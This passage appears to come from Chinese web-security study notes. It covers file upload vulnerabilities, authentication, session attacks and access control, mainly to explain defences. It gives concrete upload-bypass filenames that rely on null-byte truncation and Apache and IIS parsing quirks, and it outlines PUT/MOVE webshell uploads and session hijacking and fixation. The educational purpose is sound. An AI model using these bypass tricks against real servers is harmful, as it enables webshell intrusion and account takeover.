    文件上传攻击的本质就是将恶意文件或者脚本上传到服务器，专业的安全设备防御此类漏洞主要是通过对漏洞的上传利用行为和恶意文件的上传过程进行检测
    恶意文件千变万化，隐藏手法也不断推陈出新，对普通的系统管理员来说可以通过部署安全设备来帮助防御

##### <font color="yellow">0002 系统开发阶段的防御</font>

- 系统开发人员应有较强的安全意识，尤其是采用PHP语言开发系统，在系统开发阶段应充分考虑系统的安全性
- 对文件上传漏洞来说，最好能在客户端和服务器端对用户上传的文件名和文件路径等项目分别进行严格的检查

    客户端的检查虽然对技术较好的攻击者来说可以借助工具绕过，但是这也可以阻挡一些基本的试探
    服务器端的检查最好使用白名单过滤的方法，这样能防止大小写等方式的绕过，同时还需对%00截断符进行检测，对HTTP包头的content-type也和上传文件的大小也需要进行检查

##### <font color="yellow">0003 系统维护阶段的防御</font>

- 系统上线后运维人员应有较强的安全意思，积极使用多个安全检测工具对系统进行安全扫描，及时发现潜在漏洞并修复
- 定时查看系统日志，web服务器日志以发现入侵痕迹

    定时关注系统所使用到的第三方插件的更新情况，如有新版本发布建议及时更新，如果第三方插件被爆有安全漏洞更应立即进行修补

- 对于整个网站都是使用的开源代码或者使用网上的框架搭建的网站来说，尤其要注意漏洞的自查和软件版本及补丁的更新，上传功能非必选可以直接删除，除对系统自生的维护外，服务器应进行合理配置，非必选一般的目录都应去掉执行权限，上传目录可配置为只读

#### <font color="yellow">003 文件上传漏洞概述</font>

文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器命令的能力，这种攻击方法是最为直接和有效的，有时候几乎没有技术门槛

在互联网中，我们经常到文件上传功能，比如上传一张自定义的图片，分享一段视频或者照片，论坛发帖时附带一个附件，在发送邮件时附带附件等

文件上传功能本身是一个正常的业务需求，对于网站来说，很多时候也确实需要用户将文件上传服务器，所以文件上传本身没有问题，但有问题的是文件上传后，服务器怎么处理、解释文件，如果服务器的处理逻辑做得不够安全，则会导致严重的后果

文件上传后导致的常见安全问题有

- 上传文件是Web脚本语言，服务器的Web容器解释并执行了用户上传的脚本，导致代码执行
- 上传文件是Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域下的行为(其他通过类似方式控制策略文件的情况类似)
- 上传文件是病毒、木马文件，黑客用以诱使用户或者管理员下载执行
- 上传文件是钓鱼图片或包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈

除此之外，还有一些还有一些不常见的方法，如将上传文件作为一个入口，一处服务器的后台处理程序，或者上传一个合法的文本文件，其内容包含PHP脚本，再通过本地文件包含漏洞(Local File Include)执行脚本等等

在大多数情况下，文件上传漏洞一般都是指上传Web脚本能够被服务器解析的问题，也就是通常说的Webshell的问题

要完成这个攻击，要满足以下条件

- 上传的文件能够本Web容器解析执行，所以文件上传后所在的目录要是Web容器所覆盖到的路径
- 用户能够从Web上访问这个文件，如果文件上传了，但用户无法通过Web访问，或者无法使得Web容器解释这个脚本，那么也不能称之为漏洞
- 用户上传的文件如果被安全检查、格式化、图片压缩等功能改变了内容，则也可能导致攻击不成功

1. FCKEditor文件上传漏洞

    FCKEditor是一款非常流行的富文本编辑器，为了方便用户，它带有一个上传文件功能，但是这个功能却出过许多次漏洞

    FCKEditor针对ASP/PHP/JSP等环境都有对应的版本

    黑名单与白名单的问题，在第一章中就有过论述，黑名单是一种非常不好的设计思想

    由于FCKEditor一般是作为第三方应用集成到网站中的，因此文件上传的目录一般默认都会被Web容器所解析，很容易形成文件上传漏洞

    很多开发者在使用FCKEditor时，可能都不知道它存在一个文件上传功能，如果不是特别需要，建议删除FCKEditor的文件上传代码，一般情况下也用不到它

2. 绕过文件上传检查功能

    在针对上传文件的检查中，很多应用都是通过判断文件名后缀的方法来验证文件的安全性的

    但是在某些时候，如果攻击者手动修改了上传过程的POST包，在文件名后添加一个%00字节，则可以截断某些函数对文件名的判断

    因为在许多语言的函数中，比如在C、PHP等语言的常用字符串处理函数中，0x00被认为是终止符，受此影响的环境有Web应用和一些服务器

    比如应用原本只允许上传JPG图片，那么可以构造文件名(需要修改POST包)为xxx.php[\0].JPG，其中[\0]为十六进制的0x00字符，.JPG绕过了应用的上传文件类型判断，但对于服务器端来说，此文件因为0字节截断的关系，最终却会变成xxx.php，%00字符截断的问题不只在上传文件漏洞中有所利用，因为这是一个被广泛用于字符串处理函数的保留字符，因此在各种不同的业务逻辑中都可能出现问题，需要引起重视

    除了常见的检查文件名后缀的方法外，有的应用，还会通过判断上传文件的文件头来验证文件的类型

    在正常情况下，通过判断前10个字节，基本上就能判断出一个文件的真实类型

    浏览器的MIME Sniff功能实际上也是通过读取文件的前256个字节，来判断文件的类型的

#### <font color="yellow">004 功能/漏洞</font>

在文件上传漏洞的利用过程中，攻击者发现一些和Web Server本身特性相关的功能，如果加以利用，就会变成威力巨大的武器，这往往是因为应用的开发者没有深入理解Web Server的细节所导致的

##### <font color="yellow">0001 Apache文件解析问题</font>

Apache对于文件名的解析是从后往前解析的，直到遇见一个Apache认识的文件类型为止

```text
Phpshell.php.rar.rar.rar.rar.rar
```

因为Apache不认识.rar这个文件类型，所以会一直遍历后缀到.php，然后认为这是一个PHP类型的文件

Apache的这个特性，很多工程师在写应用时并不知道，即便知道，可能有的工程师也会认为这是Web Server该负责的事情

如果不考虑这些因素，写出的安全检查功能可能就会存在缺陷

##### <font color="yellow">0002 IIS文件解析问题</font>

> IIS 6在处理文件解析时，也出过一些漏洞
> 
> 前面提到的0x00字符截断文件名，在IIS和Win-dows环境下曾经出过非常类似的漏洞，不过截断字符变成了;
> 
> 当文件名为abc.asp;xx.jpg时，IIS 6会将此文件解析为abc.asp，文件名被截断了，从而导致脚本被执行
> 
> 除此漏洞外，在IIS 6中还曾经出过一个漏洞——因为处理文件夹扩展名出错，导致将/*.asp/目录下的所有文件都作为ASP文件进行解析
> 
> 这个abc.jpg，会被当做ASP文件进行解析
> 
> 注意这两个IIS的漏洞，是需要在服务器的本地硬盘上确实存在这样的文件或者文件夹，若只是通过Web应用映射出来的URL，则是无法触发的
> 
> 这些历史上存在的漏洞，也许今天还能在互联网中找到不少未修补漏洞的网站
> 
> 谈到IIS，就不得不谈在IIS中，支持PUT功能所导致的若干上传脚本问题
> 
> PUT是在WebDav中定义的一个方法，Web-Dav大大扩展了HTTP协议中GET、POST、HEAD等功能，它所包含的PUT方法，允许用户上传文件到指定的路径下
> 
> 在许多Web Server中，默认都禁用了此方法，或者对能够上传的文件类型做了严格限制，但在IIS中，如果目录支持写权限， 同时开启了WebDav，则会支持PUT方法，再结合MOVE方法， 就能够将原本只允许上传文本文件改写为脚本文件，从而执行webshell，MOVE能否执行成功，取决于IIS服务器是否勾选了“脚本资源访问”复选框一般要实施此攻击过程，攻击者应先通过OP-TIONS方法探测服务器支持的HTTP方法类型，如果支持PUT，则使用PUT上传一个指定的文本文件，最后再通过MOVE改写为脚本文件
> 
> 国内的安全研究者zwell曾经写过一个自动化的扫描工具IIS PUTScanner，以帮助检测此类问题
> 
> 从攻击原理看，PUT方法造成的安全漏洞，都是由于服务器配置不当造成的，WebDav给管理员带来了很多方便，但如果不能了解安全的风险和细节，则等于向黑客敞开了大门

##### <font color="yellow">0003 PHP CGI路径解析问题</font>

> 国内的安全组织80sec发布了一个Nginx的漏洞，指出在Nginx配置fastcgi使用PHP时，会存在文件类型解析问题，这将给上传漏洞大开方便之门
> 
> 在PHP的bug tracker上就有人分别在PHP 5.2.12和PHP5.3.1版本下提交了这一bug
> 
> PHP官方对此bug的描述，并同时给出了一个第三方补丁[http://patch.joeysmith.com/acceptpathinfo-5.3.1.patch](http://patch.joeysmith.com/acceptpathinfo-5.3.1.patch)
> 
> 可是PHP官方认为这是PHP的一个产品特性，并未接受此补丁
> 
> PHP官方对此bug的回复：这个漏洞是怎么一回事呢?其实可以说它与Nginx本身关系不大，Nginx只是作为一个代理把请求转发给fastcgi Server，PHP在后端处理这一切，因此在其他的fastcgi环境下，PHP也存在此问题，只是使用Nginx作为Web Server时，一般使用fastcgi的方式调用脚本解释器，这种使用方式最为常见
> 
> 试想：如果在任何配置为fastcgi的PHP应用里上传一张图片(可能是头像，也可能是论坛里上传的图片等)，其图片内容是PHP文件，则将导致代码执行，其他可以上传的合法文件如文本文件、压缩文件等情况类似
> 
> 出现这个漏洞的原因与在fastcgi方式下，PHP获取环境变量的方式有关
> 
> PHP的配置文件中有一个关键的选项cgi.fix_pathinfo，这个选项默认是开启的
> 
> 在映射URI时，两个环境变量很重要
> 
> - PATH_INFO
> - SCRIPT_FILENAME
> 
> 这个选项为1时，在映射URI时，将递归查询路径确认文件的合法性
> 
> PHP官方给出的建议是将cgi.fix_pathinfo设置为0，但可以预见的是，官方的消极态度在未来仍然会使得许许多多的不知情者遭受损失

##### <font color="yellow">0004 利用上传文件钓鱼</font>

> 前面讲到Web Server的一些“功能”可能会被攻击者利用，绕过文件上传功能的一些安全检查，这是服务器端的事情
> 
> 但在实际环境中，很多时候服务器端的应用，还需要为客户端买单
> 
> 钓鱼网站在传播时，会通过利用XSS、服务器端302跳转等功能，从正常的网站跳转到钓鱼网站
> 
> 但钓鱼网站，仍然会在URL中暴露真实的钓鱼网站地址，细心点的用户可能不会上当
> 
> 而利用文件上传功能，钓鱼者可以先将包含了HTML的文件上传到目标网站，然后通过传播这个文件的URL进行钓鱼，则URL中不会出现钓鱼地址，更具有欺骗性
> 
> 在正常情况下，浏览器是不会将jpg文件当做HTML执行的，但是在低版本的IE中，比如IE 6和IE 7，包括IE 8的兼容模式，浏览器都会自作聪明地将此文件当做HTML执行
> 
> 这个问题在很早以前就被用来制作网页木马，但微软一直认为这是浏览器的特性，直到IE 8中有了增强的MIMESniff，才有所缓解
> 
> 从网站的角度来说，它似乎是无辜的受害者，但面临具体业务场景时，不得不多多考虑此类问题

#### <font color="yellow">005 设计安全的文件上传功能</font>

本章一开始就提到，文件上传功能本身并没错，只是在一些条件下会被攻击者利用，从而成为漏洞

- 文件上传的目录设置为不可执行
    
	只要Web容器无法解析该目录下的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响
    
	因此此点至关重要，在实际应用中，很多大型网站的上传应用，文件上传后会放到独立的存储上，做静态文件处理，一方面方便使用缓存加速，降低性能损耗，另一方面也杜绝了脚本执行的可能
    
	但是对于一些边边角角的小应用，如果存在文件上传功能，则仍需要多加关注

- 判断文件类型
    
	在判断文件类型时，可以结合使用MIMEType、后缀检查等方式，在文件类型检查中，强烈推荐白名单的方式，黑名单的方式已经无数次被证明是不可靠的
    
	此外，对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码

- 使用随机数改写文件名和文件路径
    
	文件上传如果要执行代码，则需要用户能够访问到这个文件，在某些环境中，用户能上传，但不能访问，如果应用使用随机数改写了文件名和路径，将极大地增加攻击的成本
    
	与此同时，像shell.php.rar.rar这种文件，或者是crossdo-main.xml这种文件，都将因为文件名被改写而无法成功实施攻击

- 单独设置文件服务器的域名
    
	由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含JavaScript的XSS利用等问题将得到解决
    
	但能否如此设置，还需要看具体的业务环境

文件上传问题，看似简单，但要实现一个安全的上传功能，殊为不易

如果还要考虑到病毒、木马、色情图片与视频、反动政治文件等与具体业务结合更紧密的问题，则需要做的工作就更多了，

不断地发现问题，结合业务需求，才能设计出最合理、最安全的上传功能

#### <font color="yellow">006 总结</font>

文件上传本来是一个正常的功能，但黑客们利用这个功能就可以跨越信任边界，如果应用缺乏安全检查，或者安全检查的实现存在问题，就极有可能导致严重的后果

文件上传往往与代码执行联系在一起

因此对于所有业务中要用到的上传功能，都应该由安全工程师进行严格的检查

同时文件上传又可能存在诸如钓鱼、木马病毒等危害到最终用户的业务风险问题，使得我们在这一领域需要考虑的问题越来越多

### <font color="yellow">03 认证与会议管理</font>

#### <font color="yellow">001 用户是谁</font>

认证是最容易理解的一种安全，如果一个系统缺乏认证手段，明眼人都能看出来这是不安全的，最常见的认证方式就是用户名与密码，但认证的手段却远远不止于此，很多时候，人们会把认证和授权两个概念搞混，甚至有些安全工程师也是如此，实际上认证和授权是两件事情，认证的英文是Authentication，授权则是Authorization

分清楚这两个概念其实很简单，只需要记住下面这个事实

- 认证的目的是为了认出用户是谁
- 授权的目的是为了决定用户能够做什么

凭证(Creden-tial)

登录(Login)

用Creden-tial Login(Authentication)后，什么事情能做，什么事情不能做，Authorization就是的管辖范围了，能否进入后台这个权限的前提，是需要识别出来到底是管理员还是访客，当有人仿照了一个Creden-tial，就有可能认错人了，这些异常情况，就是因为认证出现了问题，系统的安全直接受到了威胁，认证的手段是多样化的，其目的就是为了能够识别出正确的人，如何才能准确地判断一个人是谁呢?这是一个哲学问题，在被哲学家们搞清楚之前，我们只能够依据人的不同凭证来确定一个人的身份，单一密码很脆弱的凭证， 其他诸如指纹、虹膜、人脸、声音等生物特征也能够作为识别一个人的凭证，认证实际上就是一个验证凭证的过程，如果只有一个凭证被用于认证，则称为单因素认证，如果有两个或多个凭证被用于认证，则称为双因素(Two Factors)认证或多因素认证，一般来说，多因素认证的强度要高于单因素认证，但是在用户体验上，多因素认证或多或少都会带来一些不方便的地方

#### <font color="yellow">002 密码</font>

##### <font color="yellow">0001 Burp Suite简介</font>

Burp Suite是进行Web应用安全测试集成平台，它将各种安全工具无缝地融合在一起，以支持整个测试过程中，从最初的映射和应用程序的攻击面分析，到发现和利用安全漏洞，Burp Suite结合先进的手工技术与先进的自动化，使你的工作更快，更有效，更有趣，在安全人员常用工具表([http://sectools.org/](http://sectools.org/))中，burpsuite排在第13位，且排名在不断上升，由此可见它在安全人员手中的重要性，Burp Suite的模块几乎包含整个安全测试过程，从最初对目标程序的信息采集，到漏洞扫描及其利用，多模块间高融合的配合，使得安全测试的过程更加高效

##### <font color="yellow">0002 主要模块</font>

- Target(目标)——显示目标目录结构的的一个功能
- Proxy(代理)——拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流
- Spider(蜘蛛)——应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能
- Scanner(扫描器)——高级工具，执行后，它能自动地发现web 应用程序的安全漏洞
- Intruder(入侵)——一个定制的高度可配置的工具，对web应用程序进行自动化攻击
- Repeater(中继器)——一个靠手动操作来触发单独的HTTP 请求，并分析应用程序响应的工具
- Sequencer(会话)——用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具
- Decoder(解码器)——进行手动执行或对应用程序数据者智能解码编码的工具
- Comparer(对比)——通常是通过一些相关的请求和响应得到两项数据的一个可视化的差异
- Extender(扩展)——可以让你加载Burp Suite的扩展，使用你自己的或第三方代码来扩展Burp Suit的功能
- Options(设置)——对Burp Suite的一些设置
- Alerts(警告)——Burp Suite在运行过程中发生的一写错误

##### <font color="yellow">0003 密码</font>

burpsuite基本介绍及环境配置[http://bbs.ichunqiu.com/thread-15805-1-1.html](http://bbs.ichunqiu.com/thread-15805-1-1.html)

Proxy模块(代理模块)[http://bbs.ichunqiu.com/thread-15806-1-1.html](http://bbs.ichunqiu.com/thread-15806-1-1.html)

(实验篇)Proxy模块(代理模块)[http://bbs.ichunqiu.com/thread-15807-1-1.html](http://bbs.ichunqiu.com/thread-15807-1-1.html)

Spider模块(蜘蛛爬行)[http://bbs.ichunqiu.com/thread-15864-1-1.html](http://bbs.ichunqiu.com/thread-15864-1-1.html)

(实验篇)Spider模块应用之目录爬行[http://bbs.ichunqiu.com/thread-15865-1-1.html](http://bbs.ichunqiu.com/thread-15865-1-1.html)

Scanner模块(漏洞扫描)[http://bbs.ichunqiu.com/thread-16258-1-1.html](http://bbs.ichunqiu.com/thread-16258-1-1.html)
    
密码是最常见的一种认证手段，持有正确密码的人被认为是可信的，长期以来，桌面软件、互联网都普遍以密码作为最基础的认证手段

- 优点：使用成本低，认证过程实现起来很简单
- 缺点：密码认证是一种比较弱的安全方案，可能会被猜解，要实现一个足够安全的密码认证方案，也不是一件轻松的事情

密码强度是设计密码认证方案时第一个需要考虑的问题，在用户密码强度的选择上，每个网站都有自己的策略，目前并没有一个标准的密码策略，但是根据OWASP推荐的一些最佳实践，我们可以对密码策略稍作总结[http://www.owasp.org](http://www.owasp.org)

长度限制

- 普通应用要求长度为6位以上
- 重要应用要求长度为8位以上，并考虑双因素认证

复杂度限制

- 密码区分大小写字母
- 密码为大写字母、小写字母、数字、特殊符号中两种以上的组合
- 不要有连续性的字符，这种字符顺着人的思路，所以很容易猜解
- 尽量避免出现重复的字符

除了OWASP推荐的策略外，还需要注意，不要使用用户的公开数据，或者是与个人隐私相关的数据作为密码，比如不要使用QQ号、身份证号码、昵称、电话号码(含手机号码)、生日、 英文名、公司名等作为密码，这些资料往往可以从互联网上获得，并不是那么保密，微博网站Twitter在用户注册的过程中，列出了一份长达300个单词的弱密码列表，如果用户使用的密码被包含在这个列表中，则会提示用户此密码不安全，目前黑客们常用的一种暴力破解手段，不是破解密码，而是选择一些弱口令，然后猜解用户名，直到发现一个 使用弱口令的账户为止，由于用户名往往是公开的信息，攻击者可以收集一份用户名的字典，使得这种攻击的成本非常低，而效果却比暴力破解密码要好很多

密码的保存也有一些需要注意的地方，一般来说，密码必须以不可逆的加密算法，或者是单向散列函数算法，加密后存储在数据库中，这样做是为了尽最大可能地保证密码的私密性，即使是网站的管理人员，也不能够看到用户的密码，在这种情况下，黑客即使入侵了网站，导出了数据库中的数据，也无法获取到密码的明文，国内最大的开发者社区CSDN的数据库被黑客公布在网上，令人震惊的是，CSDN将用户的密码明文保存在数据库中，致使600万用户的密码被泄露，明文保存密码的后果很严重，黑客们曾经利用这些用户名与密码，尝试登录了包括QQ、 人人网、新浪微博、支付宝等在内的很多大型网站，致使数以万计的用户处于风险中，一个提供彩虹表查询的MD5破解网站为了避免密码哈希值泄露后，黑客能够直接通过彩虹表查询出密码明文，在计算密码明文的哈希值时，增加一个Salt，Salt是一个字符串，它的作用是为了增加明文的复杂度，并能使得彩虹表一类的攻击失效，Salt应该保存在服务器端的配置文件中，并妥善保管

#### <font color="yellow">003 多因素认证</font>

对于很多重要的系统来说，如果只有密码作为唯一的认证手段，从安全上看会略显不足，因此为了增强安全性，大多数网上银行和网上支付平台都会采用双因素认证或多因素认证，除了支付密码外，手机动态口令、数字证书、宝令、支付盾、第三方证书等都可用于用户认证，这些不同的认证手段可以互相结合，使得认证的过程更加安全，密码不再是唯一的认证手段，在用户密码丢失的情况下，也有可能有效地保护用户账户的安全，多因素认证提高了攻击的门槛，比如一个支付交易使用了密码与数字证书双因素认证，成功完成该交易必须满足两个条件

- 密码正确
- 进行支付的电脑必须安装了该用户的数字证书

因此，为了成功实施攻击，黑客们除了盗取用户密码外，还不得不想办法在用户电脑上完成支付，这样就大大提高了攻击的成本，e.g.：支付宝[http://alipay.com](http://alipay.com)

#### <font color="yellow">004 Session与认证</font>

密码与证书等认证手段，一般仅仅用于登录(Login)的过程，当登录完成后，用户访问网站的页面，不可能每次浏览器请求页面时都再使用密码认证一次，因此，当认证成功后，就需要替换一个对用户透明的凭证，这个凭证，就是SessionID，当用户登录完成后，在服务器端就会创建一个新的会话(Session)，会话中会保存用户的状态和相关信息，服务器端维护所有在线用户的Session，此时的认证，只需要知道是哪个用户在浏览当前的页面即可，为了告诉服务器应该使用哪一个Ses-sion，浏览器需要把当前用户持有的SessionID告知服务器，最常见的做法就是把SessionID加密后保存在Cookie中，因为 Cookie会随着HTTP请求头发送，且受到浏览器同源策略的保护，Cookie中保存的SessionID，SessionID一旦在生命周期内被窃取，就等同于账户失窃，同时由于SessionID是用户登录之后才持有的认证凭证，因此黑客不需要再攻击登录过程(比如密码)，在设计安全方案时需要意识到这一点，Session劫持就是一种通过窃取用户Ses-sionID后，使用该SessionID登录进目标账户的攻击方法，此时攻击者实际上是使用了目标账户的有效Session，如果SessionID是保存在Cookie中的，则这种攻击可以称为Cookie劫持，Cookie泄露的途径有很多，最常见的有XSS攻击、网络Sniff，以及本地木马窃取，对于通过XSS漏洞窃取Cookie的攻击，通过给Cookie标记httponly，可以有效地缓解XSS窃取Cookie的问题，但是其他的泄露途径，比如网络被嗅探，或者Cookie文件被窃取，则会涉及客户端的环境安全，需要从客户端着手解决，SessionID除了可以保存在Cookie中外，还可以保存在URL中，作为请求的一个参数，但是这种方式的安全性难以经受考验，在手机操作系统中，由于很多手机浏览器暂不支持Cookie，所以只能将SessionID作为URL的一个参数用于认证，安全研究者kxlzx曾经在博客上列出过一些无线WAP中因为sid泄露所导致的安全漏洞，[https://inbreak.net](https://inbreak.net)，其中一个典型的场景就是通过Ref-erer泄露URL中的sid，QQ的WAP邮箱曾经出过此漏洞，[https://www.inbreak.net/archives/287](https://www.inbreak.net/archives/287)，在生成SessionID时，需要保证足够的随机性，比如采用足够强的伪随机数生成算法，现在的网站开发中，都有很多成熟的开发框架可以使用，这些成熟的开发框架一般都会提供Cookie管理、Session管理的函数，可以善用这些函数和功能

#### <font color="yellow">005 Session Fixation攻击</font>

A把一个账户卖给了B，但A仍然有原有密码，如果B不更换密码，就会导致安全问题，这就是Session Fixation问题，攻击的过程是，攻击者先获取到一个未经认证的SessionID，然后将这个SessionID交给用户去认证，用户完成认证后，服务器并未更新此SessionID的值(注意是未改变SessionID，而不是未改变Session)，所以攻击者可以直接凭借此SessionID登录进用户的账户，如果SessionID保存在Cookie中，比较难做到这一点，但若是SessionID保存在URL中，则攻击者只需要诱使用户打开这个URL即可，在上一节中提到的sid，就需要认真考虑Session Fixation攻击，解决Session Fixation的正确做法是，在登录完成后，重写SessionID，如果使用sid则需要重置sid的值，如果使用Cookie，则需要增加或改变用于认证的Cookie值，值得庆幸的是，在今天使用Cookie才是互联网的主流，sid的方式渐渐被淘汰，而由于网站想保存到Cookie中的东西变得越来越多，因此用户登录后，网站将一些数据保存到关键的Cookie中，已经成为一种比较普遍的做法，Session Fixation攻击的用武之地也就变得越来越小了

#### <font color="yellow">006 Session保持攻击</font>

一般来说，Session是有生命周期的，当用户长时间未活动后，或者用户点击退出后，服务器将销毁Session，但如果攻击者能一直持有一个有效的Session(比如间隔性地刷新页面以告诉服务器这个用户仍然在活动)，而服务器对于活动的Session也一直不销毁的话，攻击者就能通过此有效Session—直使用用户的账户，成为一个永久的后门，一般的应用都会给session设置一个失效时间，当到达失效时间后，Session将被销毁，但有一些系统，出于用户体验的考虑，只要这个用户还活着，就不会让这个用户的Session失效，从而攻击者可以通过不停地发起访问请求，让Session一直活下去，安全研究者kxlzx曾经分享过这样的一个案例：[http://www.inbreak.net/archives/174](http://www.inbreak.net/archives/174)，而Cookie是可以完全由客户端控制的，通过发送带有自定义Cookie头的HTTP包，也能实现同样的效果，安全研究者cnqing曾经开发过一个叫SessionIE的工具，其中就实现了Session状态的保持，在Web开发中，网站访问量如果比较大，维护Session可能会给网站带来巨大的负担，因此，有一种做法，就是服务器端不维护Session，而把Session放在Cookie中加密保存，当浏览器访问网站时，会自动带上Cookie，服务器端只需要解密Cookie即可得到当前用户的Session了，很多应用都是利用Cookie的Expire标签来控制Session的失效时间，这就给了攻击者可乘之机，Cookie的Expire时间是完全可以由客户端控制的，篡改这个时间，并使之永久有效，就有可能获得一个永久有效的Session，而服务器端是完全无法察觉的，攻击者甚至可以为Session Cookie增加一个Expire时间，使得原本浏览器关闭就会失效的Cookie持久化地保存在本地，变成一个第三方Cookie(third-party cookie)

对抗方法：常见的做法是在一定时间后，强制销毁Session，这个时间可以是从用户登录的时间算起，设定一个阈值，比如3天后就强制Session过期，但强制销毁Session可能会影响到一些正常的用户，还可以选择的方法是当用户客户端发生变化时，要求用户重新登录，比如用户的IP、UserAgent等信息发生了变化，就可以强制销毁当前的Session，并要求用户重新登录，最后，还需要考虑的是同一用户可以同时拥有几个有效Session，若每个用户只允许拥有一个Session，则攻击者想要一直保持一个Session也是不太可能的，当用户再次登录时，攻击者所保持的Session将被踢出

#### <font color="yellow">007 单点登录(SSO)</font>

单点登录的英文全称是Single Sign On，简称SSO，它希望用户只需要登录一次，就可以访问所有的系统，从用户体验的角度看，SSO无疑让用户的使用更加的方便，从安全的角度看，SSO把风险集中在单点上，这样做是有利有弊的，SSO的优点在于风险集中化，就只需要保护好这一个点，如果让每个系统各自实现登录功能，由于各系统的产品需求、应用环境、开发工程师的水平都存在差异，登录功能的安全标准难以统一，而SSO解决了这个问题，它把用户登录的过程集中在一个地方，在单点处设计安全方案，甚至可以考虑使用一些较重的方法，比如双因素认证，此外对于一些中小网站来说，维护一份用户名、密码也是没有太大必要的开销，所以如果能将这个工作委托给一个可以信任的第三方，就可以将精力集中在业务上，SSO的缺点同样也很明显，因为风险集中了，所以单点一旦被攻破的话，后果会非常严重，影响的范围将涉及所有使用单点登录的系统，降低这种风险的办法是在一些敏感的系统里，再单独实现一些额外的认证机制，比如网上支付平台，在付款前要求用户再输入一次密码，或者通过手机短信验证用户身份等，目前互联网上最为开放和流行的单点登录系统是OpenID，OpenID是一个开放的单点登录框架，它希望使用URI作为用户在互联网上的身份标识，每个用户(End User)将拥有一个唯一的URI，在用户登录网站(Relying Party)时，用户只需要提交他的OpenID(就是用户唯一的URI)以及OpenID的提供者(OpenID Provider)，网站就会将用户重定向到OpenID的提供者进行认证，认证完成后再重定向回网站，OpenID模式仍然存在一些问题：OpenID的提供者服务水平也有高有低，作为OpenID的提供者，一旦网站中断服务或者关闭，都将给用户带来很大的不便，因此目前大部分网站仍然是很谨慎地使用OpenID，而仅仅是将其作为一种辅助或者可选的登录模式，这也限制了OpenID的发展

#### <font color="yellow">008 总结</font>

认证的手段是丰富多彩的：在互联网中，除了密码可以用于认证外，还有很多新的认证方式可供使用，我们也可以组合使用各种认证手段，以双因素认证或多因素认证的方式，提高系统的安全强度

在Web应用中，用户登录之后，服务器端通常会建立一个新的Session以跟踪用户的状态，每个Session对应一个标识符SessionID，SessionID用来标识用户身份，一般是加密保存在Cookie中，有的网站也会将Session保存在Cookie中，以减轻服务器端维护Session的压力，围绕着Session可能会产生很多安全问题，这些问题都是在设计安全方案时需要考虑到的

### <font color="yellow">04 访问控制</font>

#### <font color="yellow">001 我能做什么</font>

权限控制，或者说访问控制，广泛应用于各个系统中，抽象地说，都是某个主体(subject)对某个客体(object)需要实施某种操作(operation)，而系统对这种操作的限制就是权限控制，在网络中，为了保护网络资源的安全，一般是通过路由设备或者防火墙建立基于IP的访问控制，这种访问控制的“主体”是网络请求的发起方(比如一台PC)，客体是网络请求的接收方(比如一台服务器)，主体对客体的操作是对客体的某个端又发起网络请求，这个操作能否执行成功，是受到防火墙ACL策略限制的，在操作系统中，对文件的访问也有访问控制，此时主体是系统的用户，客体是被访问的文件，能否访问成功，将由操作系统给文件设置的ACL(访问控制列表)决定，比如在Linux系统中，一个文件可以 执行的操作分为“读”、“写”、“执行”三种，分别由r、w、x表示

这三种操作同时对应着三种主体

- 文件拥有者
- 文件拥有者所在的用户组
- 其他用户

主体、客体、操作这三者之间的对应关系，构成了访问控制列表，在一个安全系统中，确定主体的身份是认证解决的问题，而客体是一种资源，是主体发起的请求的对象，在主体对客体进行操作的过程中，系统控制主体不能无限制地对客体进行操作，这个过程就是访问控制，主体能够做什么，就是权限，权限可以细分成不同的能力(capability)，在Linux的文件系统中，将权限分成了读、写、执行三种能力，用户可能对某个文件拥有读的权限，但却没有写的权限，在Web应用中，根据访问客体的不同，常见的访问控制可以分为基于URL的访问控制、基于方法(method)的访问控制和基于数据的访问控制，一般来说，基于URL的访问控制是最常见的，要实现一个简单的基于URL的访问控制，在基于Java的Web应用中，可以通过增加一个filter实现，当访问控制存在缺陷时，会如何呢

我们看看下面这些真实的案例，这些案例来自漏洞披露平台WooYun[http://www.wooyun.org](http://www.wooyun.org)

- 凤凰网分站后台某页面存在未授权访问漏洞[http://www.wooyun.org/bugs/wooyun-2010-0788](http://www.wooyun.org/bugs/wooyun-2010-0788)
- mop后台管理系统未授权访问[http://www.wooyun.org/bugs/wooyuii-2010-01429](http://www.wooyun.org/bugs/wooyuii-2010-01429)
- 网易某分站后台存在未授权访问[http://www.wooyun.org/bugs/wooyun-2010-01352](http://www.wooyun.org/bugs/wooyun-2010-01352)
- 酷6网某活动用户审核页面未授权访问[http://www.wooyun.org/bugs/wooyun-2010-01085](http://www.wooyun.org/bugs/wooyun-2010-01085)

在正常情况下，管理后台的页面应该只有管理员才能够访问，但这些系统未对用户访问权限进行控制，导致任意用户只要构造出了正确的URL，就能够访问到这些页面，在正常情况下，这些管理页面是不会被链接到前台页面上的，搜索引擎的爬虫也不应该搜索到这些页面，但是把需要保护的页面藏起来，并不是解决问题的办法，攻击者惯用的伎俩是使用一部包含了很多后台路径的字典，把这些藏起来的页面扫出来，在这些案例的背后，其实只需要加上简单的基于页面的访问控制，就能解决问题了

#### <font color="yellow">002 垂直权限管理</font>

访问控制实际上是建立用户与权限之间的对应关系，现在应用广泛的一种方法，就是基于角色的访问控制(Role-Based Access Control)，简称RBAC，RBAC事先会在系统中定义出不同的角色，不同的角色拥有不同的权限，一个角色实际上就是一个权限的集合，而系统的所有用户都会被分配到不同的角色中，一个用户可能拥有多个角色，角色之间有高低之分(权限高低)，在系统验证权限时，只需要验证用户所属的角色，然后就可以根据该角色所拥有的权限进行授权了，Spring Security中的权限管理，就是RBAC模型的一个实现[http://static.springframework/org/spring-security/site/](http://static.springframework/org/spring-security/site/)，Spring Security基于Spring MVC框架，它的前身是Acegi，是一套较为全面的Web安全解决方案，在Spring Security中提供了认证、授权等功能，在这里我们只关注Spring Security的授权功能，Spring Security提供了一系列的Filter Chain，每个安全检查的功能都会插入在这个链条中，在与Web系统集成时，开发者只需要将所有用户请求的URL都引入到Filter Chain即可

Spring Security提供两种权限管理方式

- 基于URL的访问控制
- 基于method的访问控制

